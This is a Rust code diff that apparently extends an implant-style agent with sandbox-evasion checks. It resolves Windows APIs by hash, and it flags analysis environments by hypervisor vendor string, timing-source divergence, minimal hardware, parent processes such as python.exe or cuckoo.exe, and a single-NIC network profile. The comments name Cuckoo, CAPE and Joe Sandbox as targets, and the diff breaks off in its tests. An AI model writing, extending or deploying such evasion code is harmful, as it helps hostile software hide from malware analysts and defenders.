@@ -123,6 +123,17 @@ mod win_resolve {
     // ── API hash constants (iphlpapi) ──────────────────────────────────────────
     pub const HASH_GETADAPTERSADDRESSES: u32 = hash_str_const(b"GetAdaptersAddresses\0");
 
+    // ── API hash constants — hardened detection indicators ────────────────────
+    pub const HASH_QUERYPERFORMANCECOUNTER: u32 = hash_str_const(b"QueryPerformanceCounter\0");
+    pub const HASH_QUERYPERFORMANCEFREQUENCY: u32 = hash_str_const(b"QueryPerformanceFrequency\0");
+    pub const HASH_GETSYSTEMTIMEPRECISEASFILETIME: u32 =
+        hash_str_const(b"GetSystemTimePreciseAsFileTime\0");
+    pub const HASH_CREATETOOLHELP32SNAPSHOT: u32 = hash_str_const(b"CreateToolhelp32Snapshot\0");
+    pub const HASH_PROCESS32FIRSTW: u32 = hash_str_const(b"Process32FirstW\0");
+    pub const HASH_PROCESS32NEXTW: u32 = hash_str_const(b"Process32NextW\0");
+    pub const HASH_CLOSEHANDLE: u32 = hash_str_const(b"CloseHandle\0");
+    pub const HASH_GETCURRENTPROCESSID: u32 = hash_str_const(b"GetCurrentProcessId\0");
+
     // ── Function pointer types ─────────────────────────────────────────────────
 
     // kernel32
@@ -188,6 +199,28 @@ mod win_resolve {
         *mut crate::win_types::IP_ADAPTER_ADDRESSES,
         *mut u32,
     ) -> u32;
+
+    // ── Function pointer types — hardened detection indicators ─────────────────
+
+    // kernel32 — timing
+    pub type FnQueryPerformanceCounter = unsafe extern "system" fn(*mut i64) -> i32;
+    pub type FnQueryPerformanceFrequency = unsafe extern "system" fn(*mut i64) -> i32;
+    pub type FnGetSystemTimePreciseAsFileTime =
+        unsafe extern "system" fn(*mut crate::win_types::FILETIME);
+
+    // kernel32 — process lineage (Toolhelp32)
+    pub type FnCreateToolhelp32Snapshot =
+        unsafe extern "system" fn(u32, u32) -> *mut std::ffi::c_void;
+    pub type FnProcess32FirstW = unsafe extern "system" fn(
+        *mut std::ffi::c_void,
+        *mut crate::win_types::ProcessEntry32W,
+    ) -> i32;
+    pub type FnProcess32NextW = unsafe extern "system" fn(
+        *mut std::ffi::c_void,
+        *mut crate::win_types::ProcessEntry32W,
+    ) -> i32;
+    pub type FnCloseHandle = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+    pub type FnGetCurrentProcessId = unsafe extern "system" fn() -> u32;
 
     // ── Static atomics for EnumWindows callback ────────────────────────────────
     pub static ISWINDOWVISIBLE_PTR: AtomicU64 = AtomicU64::new(0);
@@ -1793,9 +1826,9 @@ pub fn collect_indicators() -> Vec<common::SandboxIndicator> {
     if cloud_hypervisor {
         indicators.push(common::SandboxIndicator {
             category: "cloud_bios".to_string(),
-            detail: "Known cloud hypervisor DMI/registry strings detected".to_string(),
+            detail: "Expected cloud/container hypervisor context detected".to_string(),
             weight: 0, // Informational — does not contribute to score
-            source: "registry".to_string(),
+            source: "expected_context".to_string(),
         });
     }
     if cloud_imds {
@@ -1819,6 +1852,59 @@ pub fn collect_indicators() -> Vec<common::SandboxIndicator> {
         indicators.push(rdtsc);
     }
 
+    // ── 10. Hypervisor vendor string (CPUID 0x40000000) ──────────────────
+    // Distinguishes sandbox hypervisors (VirtualBox, unconfirmed VMware) from
+    // legitimate cloud hypervisors (Azure Hyper-V, GCP KVM).  Harder to spoof
+    // than the hypervisor bit because changing the vendor string breaks the
+    // guest OS's paravirt layer.
+    #[cfg(any(target_arch = "x86_64", target_arch = "x86"))]
+    if let Some(ind) = hypervisor_vendor_indicator(cloud_confirmed) {
+        indicators.push(ind);
+    }
+
+    // ── 11. Timing source consistency cross-check (Windows x86-64) ───────
+    // RDTSC, QPC, and GSTPAFT should all agree within 1-2% on real hardware.
+    // Sandboxes that manipulate time sources diverge by >10%.
+    #[cfg(all(windows, target_arch = "x86_64"))]
+    if let Some(ind) = timing_consistency_indicator() {
+        indicators.push(ind);
+    }
+
+    // ── 12. Hardware topology (CPU count, RAM, disk) ──────────────────────
+    // Sandboxes often provision minimal resources; these are collected before
+    // the cloud-aware weight zeroing below.
+    hardware_topology_indicators(&mut indicators);
+
+    // ── 12b. Zero topology and network weights when cloud is confirmed ────
+    // On confirmed cloud VMs (Azure, GCP, AWS) small resource counts and a
+    // single NIC are EXPECTED (cheap-tier VMs start at 1-2 vCPUs / 1 GiB).
+    // Lineage and timing indicators keep their full weight regardless of cloud
+    // because analysis frameworks never run in production cloud VMs.
+    if cloud_confirmed {
+        for indicator in indicators.iter_mut() {
+            if indicator.source == "topology" || indicator.source == "network" {
+                indicator.weight = 0;
+            }
+        }
+    }
+
+    // ── 13. Process lineage analysis (Windows) ────────────────────────────
+    // Sandboxes (Cuckoo, CAPE, Joe Sandbox) spawn samples from python.exe or
+    // java.exe.  This signal is NOT cloud-aware (analysis tools don't run in
+    // production cloud deployments).
+    #[cfg(windows)]
+    if let Some(ind) = process_lineage_indicator() {
+        indicators.push(ind);
+    }
+
+    // ── 14. Network environment (Windows) ─────────────────────────────────
+    // A single physical NIC with no enterprise proxy is a mild sandbox signal.
+    // Weight is zeroed on confirmed cloud by step 12b above.
+    #[cfg(windows)]
+    if let Some(ind) = network_environment_indicator() {
+        indicators.push(ind);
+    }
+
     indicators
 }
 
@@ -1836,9 +1922,10 @@ pub fn collect_indicators() -> Vec<common::SandboxIndicator> {
 pub fn evaluate_sandbox_score(
     indicators: &[common::SandboxIndicator],
 ) -> (bool, u32, Vec<common::SandboxIndicator>) {
-    let cloud_hypervisor = indicators
-        .iter()
-        .any(|i| i.category == "cloud_bios" && i.detail.contains("DMI/registry"));
+    let cloud_hypervisor = indicators.iter().any(|i| {
+        i.category == "cloud_bios"
+            && (i.source == "expected_context" || i.detail.contains("DMI/registry"))
+    });
     let cloud_imds = indicators
         .iter()
         .any(|i| i.category == "cloud_bios" && i.detail.contains("IMDS"));
@@ -1855,10 +1942,14 @@ pub fn evaluate_sandbox_score(
         .map(|i| i.weight)
         .sum();
     let has_vm_artifact_signal = indicators.iter().any(|i| {
-        matches!(
-            i.source.as_str(),
-            "cpuid" | "dmi" | "registry" | "mac" | "imds"
-        )
+        i.weight > 0
+            && matches!(
+                i.source.as_str(),
+                "cpuid" | "dmi" | "registry" | "mac" | "imds"
+                    | "cpuid_vendor"       // hypervisor vendor string
+                    | "rdtsc_consistency"  // timing source cross-check
+                    | "lineage" // analysis-framework parent process
+            )
     });
 
     // Adaptive threshold (mirrors the original detect_vm logic).
@@ -3204,6 +3295,659 @@ pub struct EnvDecision {
     pub refuse: bool,
 }
 
+// ══════════════════════════════════════════════════════════════════════════════
+//  HARDENED DETECTION INDICATORS
+//
+//  Five new signals that are substantially harder for analysis sandboxes to
+//  spoof while remaining immune to false positives on legitimate cloud VMs:
+//
+//  1. Hypervisor vendor string (CPUID 0x40000000) — distinguishes sandbox
+//     hypervisors (VirtualBox, unauthenticated VMware) from cloud hypervisors
+//     (Azure Hyper-V, GCP/AWS KVM).  The CPUID *bit* (leaf 1 ECX[31]) is
+//     already checked; this reads the 12-byte *vendor string* which is harder
+//     to spoof without breaking the guest OS.
+//
+//  2. Timing source consistency cross-check (Windows x86-64) — measures a
+//     known workload with RDTSC, QueryPerformanceCounter, and
+//     GetSystemTimePreciseAsFileTime.  Physical and properly-virtualised
+//     hardware keeps all three within 1-2%; sandboxes that manipulate time
+//     sources diverge by >10%.
+//
+//  3. Hardware topology (CPU count, RAM, disk) — analysis sandboxes often
+//     provision minimal resources (1 vCPU, <2 GiB RAM, <40 GiB disk).
+//     Weight is zeroed when cloud is confirmed so legitimate small-tier VMs
+//     are not penalised.
+//
+//  4. Process lineage (Windows) — analysis frameworks (Cuckoo, CAPE, Joe
+//     Sandbox) typically spawn the sample from python.exe or java.exe.  No
+//     legitimate endpoint management tool uses these as parent processes.
+//     Weight is NOT zeroed on cloud (analysis frameworks don't run in cloud).
+//
+//  5. Network environment (Windows) — a single physical NIC with no
+//     enterprise proxy configured is a mild sandbox indicator.  Weight is
+//     zeroed on confirmed cloud (cloud VMs legitimately have one NIC).
+// ══════════════════════════════════════════════════════════════════════════════
+
+// ── 1. Hypervisor vendor string ───────────────────────────────────────────────
+
+/// Read the 12-byte hypervisor vendor string from CPUID leaf 0x40000000.
+///
+/// This is distinct from the CPUID hypervisor BIT (leaf 1, ECX[31]) — the
+/// vendor string identifies *which* hypervisor is running.  Returns `None`
+/// when the hypervisor bit is not set or the vendor reports all-zero bytes.
+#[cfg(any(target_arch = "x86_64", target_arch = "x86"))]
+fn read_hypervisor_vendor_string() -> Option<[u8; 12]> {
+    #[cfg(target_arch = "x86")]
+    use std::arch::x86::__cpuid;
+    #[cfg(target_arch = "x86_64")]
+    use std::arch::x86_64::__cpuid;
+
+    // Only proceed if the hypervisor bit is set (leaf 1, ECX[31]).
+    #[allow(unused_unsafe)]
+    let r1 = unsafe { __cpuid(1) };
+    if (r1.ecx & (1 << 31)) == 0 {
+        return None;
+    }
+
+    // Leaf 0x40000000 — hypervisor vendor is in EBX:ECX:EDX (12 bytes).
+    #[allow(unused_unsafe)]
+    let r = unsafe { __cpuid(0x40000000) };
+    let mut vendor = [0u8; 12];
+    vendor[0..4].copy_from_slice(&r.ebx.to_le_bytes());
+    vendor[4..8].copy_from_slice(&r.ecx.to_le_bytes());
+    vendor[8..12].copy_from_slice(&r.edx.to_le_bytes());
+
+    // All-zero vendor means hypervisor bit set but no identity reported.
+    if vendor.iter().all(|&b| b == 0) {
+        return None;
+    }
+    Some(vendor)
+}
+
+/// Classify a raw 12-byte hypervisor vendor string into a `SandboxIndicator`.
+///
+/// This is a pure function exposed for unit testing.  Production callers use
+/// [`hypervisor_vendor_indicator`] which reads the CPU directly.
+///
+/// `cloud_confirmed` is `true` when both `is_expected_hypervisor()` and
+/// `is_cloud_instance()` agree — in which case known cloud hypervisors get
+/// weight 0 (they are expected and benign).
+fn classify_hypervisor_vendor(
+    vendor: &[u8; 12],
+    cloud_confirmed: bool,
+) -> Option<common::SandboxIndicator> {
+    // VirtualBox: "VBoxVBoxVBox".  No legitimate cloud uses VirtualBox.
+    // High weight even when cloud is ostensibly confirmed (impossible scenario).
+    if vendor.starts_with(b"VBoxVBoxVBox") {
+        return Some(common::SandboxIndicator {
+            category: "hypervisor_vendor".to_string(),
+            detail: "VirtualBox hypervisor vendor (CPUID 0x40000000)".to_string(),
+            weight: 30,
+            source: "cpuid_vendor".to_string(),
+        });
+    }
+
+    // VMware: "VMwareVMware".  Used by many sandbox products (Cuckoo, CAPE,
+    // Triage).  Also used by enterprise VMware vCloud, so reduce weight when
+    // cloud is confirmed.
+    if vendor.starts_with(b"VMwareVMware") {
+        let weight = if cloud_confirmed { 5 } else { 20 };
+        return Some(common::SandboxIndicator {
+            category: "hypervisor_vendor".to_string(),
+            detail: "VMware hypervisor vendor (CPUID 0x40000000)".to_string(),
+            weight,
+            source: "cpuid_vendor".to_string(),
+        });
+    }
+
+    // Microsoft Hyper-V: "Microsoft Hv".  Azure uses this, as do Windows
+    // Sandbox and analysis VMs on bare-metal Hyper-V.  Weight 0 when cloud
+    // is confirmed; mild suspicion otherwise.
+    if vendor.starts_with(b"Microsoft Hv") {
+        let weight = if cloud_confirmed { 0 } else { 10 };
+        if weight > 0 {
+            return Some(common::SandboxIndicator {
+                category: "hypervisor_vendor".to_string(),
+                detail: "Microsoft Hv hypervisor vendor — cloud unconfirmed (Hyper-V sandbox?)"
+                    .to_string(),
+                weight,
+                source: "cpuid_vendor".to_string(),
+            });
+        }
+        return None;
+    }
+
+    // KVM: "KVMKVMKVM\0\0\0".  Used by GCP, DigitalOcean, many IaaS providers,
+    // and Cuckoo/QEMU-based sandboxes.  Weight 0 when cloud is confirmed.
+    if vendor[..9] == *b"KVMKVMKVM" {
+        let weight = if cloud_confirmed { 0 } else { 10 };
+        if weight > 0 {
+            return Some(common::SandboxIndicator {
+                category: "hypervisor_vendor".to_string(),
+                detail: "KVM hypervisor vendor — cloud unconfirmed (QEMU sandbox?)".to_string(),
+                weight,
+                source: "cpuid_vendor".to_string(),
+            });
+        }
+        return None;
+    }
+
+    // Xen: "XenVMMXenVMM".  Used on older AWS and analysis platforms.
+    if vendor.starts_with(b"XenVMMXenVMM") {
+        let weight = if cloud_confirmed { 0 } else { 15 };
+        if weight > 0 {
+            return Some(common::SandboxIndicator {
+                category: "hypervisor_vendor".to_string(),
+                detail: "Xen hypervisor vendor — cloud unconfirmed".to_string(),
+                weight,
+                source: "cpuid_vendor".to_string(),
+            });
+        }
+        return None;
+    }
+
+    // Unrecognised vendor: rare, mildly suspicious on unconfirmed hosts.
+    let printable: String = vendor
+        .iter()
+        .map(|&b| {
+            if b.is_ascii_graphic() || b == b' ' {
+                b as char
+            } else {
+                '?'
+            }
+        })
+        .collect();
+    let weight = if cloud_confirmed { 0 } else { 5 };
+    if weight > 0 {
+        return Some(common::SandboxIndicator {
+            category: "hypervisor_vendor".to_string(),
+            detail: format!("Unrecognised hypervisor vendor: '{printable}' (CPUID 0x40000000)"),
+            weight,
+            source: "cpuid_vendor".to_string(),
+        });
+    }
+    None
+}
+
+/// Read the CPU's hypervisor vendor string and return a `SandboxIndicator`
+/// when the vendor is suspicious.  x86/x86-64 only.
+#[cfg(any(target_arch = "x86_64", target_arch = "x86"))]
+fn hypervisor_vendor_indicator(cloud_confirmed: bool) -> Option<common::SandboxIndicator> {
+    let vendor = read_hypervisor_vendor_string()?;
+    classify_hypervisor_vendor(&vendor, cloud_confirmed)
+}
+
+// ── 2. Timing source consistency cross-check (Windows x86-64) ────────────────
+
+/// Measure a known workload with three independent time sources (RDTSC, QPC,
+/// `GetSystemTimePreciseAsFileTime`) and flag divergence > 10%.
+///
+/// Physical and properly-virtualised hosts keep all three sources within 1-2%
+/// of each other.  Sandboxes that manipulate time (e.g. Cuckoo in
+/// `clock_resolution` mode) cause RDTSC to disagree with the wall clock by an
+/// amount the sandbox cannot easily hide without breaking the guest OS.
+///
+/// Returns `None` when any time source is unavailable (e.g. `GSTPAFT` on
+/// Windows 7, or non-invariant TSC on very old CPUs).
+#[cfg(all(windows, target_arch = "x86_64"))]
+fn timing_consistency_indicator() -> Option<common::SandboxIndicator> {
+    use crate::win_types::FILETIME;
+
+    // Resolve QPC and GSTPAFT — graceful failure on older Windows / VMs.
+    let qpc: win_resolve::FnQueryPerformanceCounter = unsafe {
+        win_resolve::resolve_api(
+            pe_resolve::HASH_KERNEL32_DLL,
+            win_resolve::HASH_QUERYPERFORMANCECOUNTER,
+        )?
+    };
+    let qpf: win_resolve::FnQueryPerformanceFrequency = unsafe {
+        win_resolve::resolve_api(
+            pe_resolve::HASH_KERNEL32_DLL,
+            win_resolve::HASH_QUERYPERFORMANCEFREQUENCY,
+        )?
+    };
+    let gstpaft: win_resolve::FnGetSystemTimePreciseAsFileTime = unsafe {
+        win_resolve::resolve_api(
+            pe_resolve::HASH_KERNEL32_DLL,
+            win_resolve::HASH_GETSYSTEMTIMEPRECISEASFILETIME,
+        )?
+    };
+
+    let mut qpc_freq: i64 = 0;
+    unsafe { qpf(&mut qpc_freq) };
+    if qpc_freq <= 0 {
+        return None; // Degenerate: no QPC frequency
+    }
+
+    // ── Snapshot T0 ───────────────────────────────────────────────────────────
+    let tsc0 = unsafe { std::arch::x86_64::_rdtsc() };
+    let mut qpc0: i64 = 0;
+    unsafe { qpc(&mut qpc0) };
+    let mut ft0 = FILETIME::default();
+    unsafe { gstpaft(&mut ft0) };
+
+    // ── Known workload: 10,000 multiply-accumulate iterations ─────────────────
+    // Written to `acc` via `write_volatile` so the compiler cannot eliminate
+    // the loop; the pattern is deterministic and fast (< 100 µs on any CPU).
+    let mut acc: u64 = 1;
+    for i in 0u64..10_000 {
+        acc = acc.wrapping_mul(i.wrapping_add(1)).wrapping_add(i);
+    }
+    // Prevent dead-code elimination.
+    unsafe { std::ptr::write_volatile(&mut acc, acc) };
+
+    // ── Snapshot T1 ───────────────────────────────────────────────────────────
+    let tsc1 = unsafe { std::arch::x86_64::_rdtsc() };
+    let mut qpc1: i64 = 0;
+    unsafe { qpc(&mut qpc1) };
+    let mut ft1 = FILETIME::default();
+    unsafe { gstpaft(&mut ft1) };
+
+    let tsc_delta = tsc1.saturating_sub(tsc0);
+    let qpc_delta = qpc1.saturating_sub(qpc0).max(0) as u64;
+    let ft_u64 = |ft: FILETIME| -> u64 {
+        ((ft.dw_high_date_time as u64) << 32) | ft.dw_low_date_time as u64
+    };
+    let ft_delta = ft_u64(ft1).saturating_sub(ft_u64(ft0));
+
+    // Emulator indicator: RDTSC did not advance while QPC progressed.
+    // Under hardware virtualisation RDTSC is passed through transparently;
+    // only emulators that don't simulate the TSC register will produce this.
+    if tsc_delta == 0 && qpc_delta > 100 {
+        return Some(common::SandboxIndicator {
+            category: "timing_consistency".to_string(),
+            detail: "RDTSC delta is 0 while QPC advanced (TSC not emulated — full emulator)"
+                .to_string(),
+            weight: 20,
+            source: "rdtsc_consistency".to_string(),
+        });
+    }
+
+    // Time-skew indicator: QPC (in 100ns units) vs GSTPAFT diverge by > 10%.
+    // Convert QPC ticks to 100ns: (qpc_delta * 10_000_000) / freq.
+    if ft_delta > 0 && qpc_delta > 0 {
+        let qpc_in_100ns = (qpc_delta as u128)
+            .saturating_mul(10_000_000)
+            .checked_div(qpc_freq as u128)
+            .unwrap_or(0) as u64;
+        if qpc_in_100ns > 0 {
+            let max_v = qpc_in_100ns.max(ft_delta);
+            let min_v = qpc_in_100ns.min(ft_delta);
+            let divergence_pct = (max_v - min_v).saturating_mul(100) / max_v;
+            if divergence_pct > 10 {
+                return Some(common::SandboxIndicator {
+                    category: "timing_consistency".to_string(),
+                    detail: format!(
+                        "QPC and wall-clock diverge by {divergence_pct}% (time source manipulation)"
+                    ),
+                    weight: 20,
+                    source: "rdtsc_consistency".to_string(),
+                });
+            }
+        }
+    }
+
+    None
+}
+
+// ── 3. Hardware topology ──────────────────────────────────────────────────────
+
+/// Check CPU count, RAM, and system-disk size for sandbox-typical minimal
+/// resource provisioning.
+///
+/// Analysis sandboxes commonly use 1 vCPU and <2 GiB RAM to reduce overhead.
+/// Legitimate cloud VMs at even the smallest tier (e.g. AWS t3.micro) have
+/// 2 vCPUs and 1 GiB RAM — still suspicious by this check, but the
+/// `cloud_confirmed` path in `collect_indicators` zeroes all "topology" source
+/// weights when the cloud context is confirmed, so legitimate small VMs are
+/// not penalised.
+#[cfg(windows)]
+fn hardware_topology_indicators(indicators: &mut Vec<common::SandboxIndicator>) {
+    // ── CPU count via GetSystemInfo ───────────────────────────────────────────
+    let cpu_count: u32 = {
+        let get_sysinfo: win_resolve::FnGetSystemInfo = unsafe {
+            win_resolve::resolve_api(
+                pe_resolve::HASH_KERNEL32_DLL,
+                win_resolve::HASH_GETSYSTEMINFO,
+            )
+            .expect("GetSystemInfo not found")
+        };
+        let mut si = win_resolve::SystemInfo::default();
+        unsafe { get_sysinfo(&mut si) };
+        si.dw_number_of_processors
+    };
+
+    match cpu_count {
+        0 | 1 => indicators.push(common::SandboxIndicator {
+            category: "topology".to_string(),
+            detail: format!("{cpu_count} logical CPU(s) — sandboxes commonly use 1 vCPU"),
+            weight: 15,
+            source: "topology".to_string(),
+        }),
+        2 => indicators.push(common::SandboxIndicator {
+            category: "topology".to_string(),
+            detail: "2 logical CPUs — suspicious but possible for small cloud VMs".to_string(),
+            weight: 5,
+            source: "topology".to_string(),
+        }),
+        _ => {} // 4+ CPUs → normal
+    }
+
+    // ── RAM via get_ram_gb() ──────────────────────────────────────────────────
+    let ram_gb = get_ram_gb();
+    if ram_gb < 2 {
+        indicators.push(common::SandboxIndicator {
+            category: "topology".to_string(),
+            detail: format!("{ram_gb} GiB RAM — sandboxes often provision <2 GiB"),
+            weight: 15,
+            source: "topology".to_string(),
+        });
+    }
+
+    // ── System disk size via GetDiskFreeSpaceExW on C:\ ───────────────────────
+    let get_disk: win_resolve::FnGetDiskFreeSpaceExW = unsafe {
+        win_resolve::resolve_api(
+            pe_resolve::HASH_KERNEL32_DLL,
+            win_resolve::HASH_GETDISKFREESPACEEXW,
+        )
+        .expect("GetDiskFreeSpaceExW not found")
+    };
+    // C:\ as null-terminated wide string.
+    const C_DRIVE_W: &[u16] = &['C' as u16, ':' as u16, '\\' as u16, 0u16];
+    let mut _free_caller: u64 = 0;
+    let mut total_bytes: u64 = 0;
+    let mut _free_total: u64 = 0;
+    let ok = unsafe {
+        get_disk(
+            C_DRIVE_W.as_ptr(),
+            &mut _free_caller,
+            &mut total_bytes,
+            &mut _free_total,
+        )
+    };
+    if ok != 0 {
+        let disk_gb = total_bytes / (1024 * 1024 * 1024);
+        if disk_gb > 0 && disk_gb < 40 {
+            indicators.push(common::SandboxIndicator {
+                category: "topology".to_string(),
+                detail: format!(
+                    "C:\\ disk is {disk_gb} GiB — sandboxes often use <40 GiB system disks"
+                ),
+                weight: 10,
+                source: "topology".to_string(),
+            });
+        }
+    }
+}
+
+#[cfg(not(windows))]
+fn hardware_topology_indicators(_indicators: &mut Vec<common::SandboxIndicator>) {
+    // Not implemented on non-Windows platforms.
+}
+
+// ── 4. Process lineage analysis (Windows) ─────────────────────────────────────
+
+/// Classify a parent process name as suspicious, returning a `SandboxIndicator`
+/// when the name matches a known analysis framework.
+///
+/// This is a pure function exposed for unit testing.
+fn classify_parent_process_name(parent_name: Option<&str>) -> Option<common::SandboxIndicator> {
+    // Analysis frameworks that commonly spawn malware samples directly.
+    // These names never appear as legitimate endpoint management parent processes.
+    const ANALYSIS_FRAMEWORKS: &[&str] = &[
+        "python.exe",
+        "python3.exe",
+        "pythonw.exe",
+        "java.exe",
+        "javaw.exe",
+        "node.exe",
+        "nodejs.exe",
+        "ruby.exe",
+        "perl.exe",
+        "sample_runner.exe",
+        "malware_runner.exe",
+        "analyzer.exe",
+        "cuckoo.exe",
+        "cuckoomon.dll",
+        "cape.exe",
+    ];
+
+    match parent_name {
+        // No parent found — process was orphaned or parent has already exited
+        // (e.g., setup.exe dropped the agent and then exited).  Mild suspicion.
+        None => Some(common::SandboxIndicator {
+            category: "lineage".to_string(),
+            detail: "No parent process found in snapshot (agent may be orphaned)".to_string(),
+            weight: 5,
+            source: "lineage".to_string(),
+        }),
+        Some(name) if ANALYSIS_FRAMEWORKS.contains(&name) => Some(common::SandboxIndicator {
+            category: "lineage".to_string(),
+            detail: format!("Agent spawned by analysis-framework process: {name}"),
+            weight: 25,
+            source: "lineage".to_string(),
+        }),
+        _ => None, // Legitimate parent
+    }
+}
+
+/// Walk the parent process chain using `CreateToolhelp32Snapshot` and return a
+/// `SandboxIndicator` when the immediate parent is an analysis framework.
+///
+/// Why this doesn't produce false positives on cloud VMs:
+/// Analysis frameworks (Cuckoo, CAPE, Joe Sandbox) do not run inside
+/// production cloud VMs.  No legitimate CI/CD or deployment tool spawns agents
+/// from python.exe or java.exe at runtime.
+#[cfg(windows)]
+fn process_lineage_indicator() -> Option<common::SandboxIndicator> {
+    use crate::win_types::{ProcessEntry32W, INVALID_HANDLE_VALUE};
+
+    // Resolve Toolhelp32 APIs via the existing dynamic resolver.
+    let create_snapshot: win_resolve::FnCreateToolhelp32Snapshot = unsafe {
+        win_resolve::resolve_api(
+            pe_resolve::HASH_KERNEL32_DLL,
+            win_resolve::HASH_CREATETOOLHELP32SNAPSHOT,
+        )?
+    };
+    let process32_first: win_resolve::FnProcess32FirstW = unsafe {
+        win_resolve::resolve_api(
+            pe_resolve::HASH_KERNEL32_DLL,
+            win_resolve::HASH_PROCESS32FIRSTW,
+        )?
+    };
+    let process32_next: win_resolve::FnProcess32NextW = unsafe {
+        win_resolve::resolve_api(
+            pe_resolve::HASH_KERNEL32_DLL,
+            win_resolve::HASH_PROCESS32NEXTW,
+        )?
+    };
+    let close_handle: win_resolve::FnCloseHandle = unsafe {
+        win_resolve::resolve_api(pe_resolve::HASH_KERNEL32_DLL, win_resolve::HASH_CLOSEHANDLE)?
+    };
+    let get_cur_pid: win_resolve::FnGetCurrentProcessId = unsafe {
+        win_resolve::resolve_api(
+            pe_resolve::HASH_KERNEL32_DLL,
+            win_resolve::HASH_GETCURRENTPROCESSID,
+        )?
+    };
+
+    let our_pid = unsafe { get_cur_pid() };
+
+    // TH32CS_SNAPPROCESS = 0x00000002 — enumerate all processes.
+    let snapshot = unsafe { create_snapshot(0x00000002, 0) };
+    if snapshot == INVALID_HANDLE_VALUE || snapshot.is_null() {
+        return None;
+    }
+
+    // Collect (pid, parent_pid, exe_name_lowercase) for all processes.
+    let mut processes: Vec<(u32, u32, String)> = Vec::with_capacity(128);
+    let mut entry = ProcessEntry32W {
+        dw_size: std::mem::size_of::<ProcessEntry32W>() as u32,
+        ..ProcessEntry32W::default()
+    };
+
+    if unsafe { process32_first(snapshot, &mut entry) } != 0 {
+        loop {
+            let name_len = entry
+                .sz_exe_file
+                .iter()
+                .position(|&c| c == 0)
+                .unwrap_or(entry.sz_exe_file.len());
+            let name =
+                String::from_utf16_lossy(&entry.sz_exe_file[..name_len]).to_ascii_lowercase();
+            processes.push((entry.th32_process_id, entry.th32_parent_process_id, name));
+            // Reset size field before the next call, as documented.
+            entry.dw_size = std::mem::size_of::<ProcessEntry32W>() as u32;
+            if unsafe { process32_next(snapshot, &mut entry) } == 0 {
+                break;
+            }
+        }
+    }
+    unsafe { close_handle(snapshot) };
+
+    // Find our immediate parent PID.
+    let parent_pid = match processes
+        .iter()
+        .find(|(pid, _, _)| *pid == our_pid)
+        .map(|(_, ppid, _)| *ppid)
+    {
+        Some(ppid) => ppid,
+        None => return None, // Our own entry not found — degenerate snapshot
+    };
+
+    // Look up the parent's executable name.
+    let parent_name = processes
+        .iter()
+        .find(|(pid, _, _)| *pid == parent_pid)
+        .map(|(_, _, name)| name.as_str().to_string());
+
+    classify_parent_process_name(parent_name.as_deref())
+}
+
+#[cfg(not(windows))]
+fn process_lineage_indicator() -> Option<common::SandboxIndicator> {
+    None
+}
+
+// ── 5. Network environment profiling (Windows) ────────────────────────────────
+
+/// Check the number of physical network adapters and the presence of an
+/// enterprise proxy.
+///
+/// A single physical NIC with no proxy configured is a mild indicator of a
+/// sandbox environment (sandboxes commonly expose only the host-bridge NIC).
+/// Enterprise endpoints and cloud VMs with multiple NICs or configured proxies
+/// are excluded, keeping the false-positive rate near zero.
+///
+/// Why cloud VMs don't produce false positives:
+/// The "topology" source weight is zeroed when cloud is confirmed (step 10b in
+/// `collect_indicators`), so even a cloud VM with one NIC doesn't contribute.
+/// The lineage and timing indicators still carry full weight on cloud VMs
+/// because analysis frameworks don't run there.
+#[cfg(windows)]
+fn network_environment_indicator() -> Option<common::SandboxIndicator> {
+    use crate::win_types::IP_ADAPTER_ADDRESSES;
+
+    const AF_UNSPEC: u32 = 0;
+    // Skip address lists we don't need; we only care about physical MACs.
+    const GAA_FLAG_SKIP_UNICAST: u32 = 0x0001;
+    const GAA_FLAG_SKIP_ANYCAST: u32 = 0x0002;
+    const GAA_FLAG_SKIP_MULTICAST: u32 = 0x0004;
+    const GAA_FLAG_SKIP_DNS_SERVER: u32 = 0x0008;
+    let flags = GAA_FLAG_SKIP_UNICAST
+        | GAA_FLAG_SKIP_ANYCAST
+        | GAA_FLAG_SKIP_MULTICAST
+        | GAA_FLAG_SKIP_DNS_SERVER;
+
+    let get_adapters: win_resolve::FnGetAdaptersAddresses = unsafe {
+        win_resolve::resolve_api_or_load(
+            win_resolve::IPHLPAPI_DLL_W,
+            win_resolve::HASH_IPHLPAPI_DLL,
+            win_resolve::HASH_GETADAPTERSADDRESSES,
+        )?
+    };
+
+    let adapter_count: usize = unsafe {
+        let mut buf_size: u32 = 0;
+        get_adapters(
+            AF_UNSPEC,
+            flags,
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+            &mut buf_size,
+        );
+        if buf_size == 0 {
+            return None;
+        }
+        let mut buf: Vec<u8> = vec![0u8; buf_size as usize];
+        let ret = get_adapters(
+            AF_UNSPEC,
+            flags,
+            std::ptr::null_mut(),
+            buf.as_mut_ptr() as *mut IP_ADAPTER_ADDRESSES,
+            &mut buf_size,
+        );
+        if ret != win_resolve::ERROR_SUCCESS {
+            return None;
+        }
+        let mut count = 0usize;
+        let mut adapter = buf.as_ptr() as *const IP_ADAPTER_ADDRESSES;
+        while !adapter.is_null() {
+            // Only count adapters with a real physical MAC address (≥6 bytes).
+            // This skips loopback, Teredo, 6to4, and WAN miniport adapters.
+            if (*adapter).physical_address_length >= 6 {
+                count += 1;
+            }
+            adapter = (*adapter).next;
+        }
+        count
+    };
+
+    // Check for a system-wide WinHTTP/WinInet proxy in the registry.
+    // A configured proxy strongly suggests an enterprise environment rather
+    // than a sandbox (sandboxes typically don't set up MITM proxy infra).
+    let proxy_configured = unsafe {
+        // Try HKLM Internet Settings for machine-wide proxy (most reliable).
+        let key = reg_open_subkey(
+            win_resolve::HKEY_LOCAL_MACHINE,
+            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
+        );
+        if let Some(k) = key {
+            let enabled = reg_read_string(k, "ProxyEnable")
+                .and_then(|s| s.trim().parse::<u32>().ok())
+                .unwrap_or(0);
+            reg_close_key(k);
+            enabled != 0
+        } else {
+            false
+        }
+    };
+
+    if proxy_configured {
+        return None; // Enterprise proxy present → not a sandbox
+    }
+
+    if adapter_count <= 1 {
+        return Some(common::SandboxIndicator {
+            category: "network".to_string(),
+            detail: format!(
+                "{adapter_count} physical NIC(s) and no enterprise proxy — common sandbox profile"
+            ),
+            weight: 5,
+            source: "network".to_string(),
+        });
+    }
+
+    None
+}
+
+#[cfg(not(windows))]
+fn network_environment_indicator() -> Option<common::SandboxIndicator> {
+    None
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -3352,6 +4096,42 @@ mod tests {
         assert!(
             !is_sandbox,
